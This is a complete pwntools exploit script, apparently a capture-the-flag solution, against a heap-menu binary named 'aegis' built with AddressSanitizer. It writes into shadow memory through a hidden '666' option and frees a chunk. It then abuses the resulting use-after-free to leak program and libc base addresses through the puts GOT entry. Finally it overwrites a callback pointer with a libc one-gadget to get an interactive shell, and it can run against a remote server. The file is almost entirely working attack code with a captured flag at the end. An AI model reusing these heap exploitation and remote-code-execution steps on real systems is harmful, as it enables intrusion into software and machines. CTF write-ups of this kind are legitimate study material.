from pwn import *


DEBUG = 1
if DEBUG:
     p = process('./aegis')
     e = ELF('./aegis')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     #libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
     #ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so') 
    
else:
     p = remote('23.236.125.55', 10002)
     #libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')


wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        debug_stri="set follow-fork-mode child\n"
        if 'int' in str(type(addr)):
            debug_stri+='b* '+hex(moduleBase+addr)+'\n'
        elif 'list' in str(type(addr)):
            for i in addr:
                debug_stri+='b* '+hex(moduleBase+i)+'\n'
        #print debug_stri
        gdb.attach(p, debug_stri)

def add(size,content,idx):
    p.recvuntil('Choice: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(content)
    p.recvuntil('ID: ')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('Choice: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    

def update(idx,content,ID):
    p.recvuntil('Choice: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Content: ')
    p.send(content)
    p.recvuntil('ID: ')
    p.sendline(str(ID))

def update1(idx,content,ID):
    p.recvuntil('Choice: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Content: ')
    p.send(content)
    #p.recvuntil('ID: ')
    #p.sendline(str(ID))

def delete(idx):
    p.recvuntil('Choice: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

def secret(addr):
    p.recvuntil('Choice: ')
    p.sendline('666')
    p.recvuntil('Number: ')
    p.sendline(str(addr))
    
def pwn():
    #debug([0x1142fb,0x114376,0x1146f1])
    #gdb.attach(p,'b add_note+0x47')
    # step1 overwirte the chunk size to 0xffffffff
    ## heap addr: x/20gx 0x602000000000
    ## shadow addr: x/20gx 0xc047fff8000
    add(0x10,'a'*8,0xffffffffffffffff)
    secret((0x602000000020>>3)+0x7FFF8000)
    
    update(0,'\x02'*0x12,0xff02ffff00020202)
    update(0,'\x02'*0x15,0xffffffff02ffffff)
    
    # step2 free the chunk
    delete(0)
    #debug([0x1142fb,0x114376,0x1146f1])

    # step3 uaf to leak program base and libc base
    add(0x10,p64(0x602000000018),0xffffffffffffff00)
    #debug([0x1145c1])
    show(0)
    p.recvuntil('Content: ')
    pro_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x114ab0
    print "program base",hex(pro_base)

    puts_got=pro_base+e.got['puts']
    print hex(puts_got)
    update(1,p64(puts_got)[:2],puts_got>>8)
    show(0)
    p.recvuntil('Content: ')
    
    libc_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-libc.symbols['puts']
    print "libc base",hex(libc_base)
    ffi_addr=libc_base+0x114ab0

    # step4 overwrite the callback got
    callback_addr=pro_base+0xFB0888
    rce=libc_base+0x10a38c
    update(1,p64(callback_addr)[:7],0x0)
    
    update(0,p8(0),rce)

    # step5 get the shell
    p.interactive()

if __name__ == '__main__':
   pwn()

#gigem{34sy_CC428ECD75A0D392}
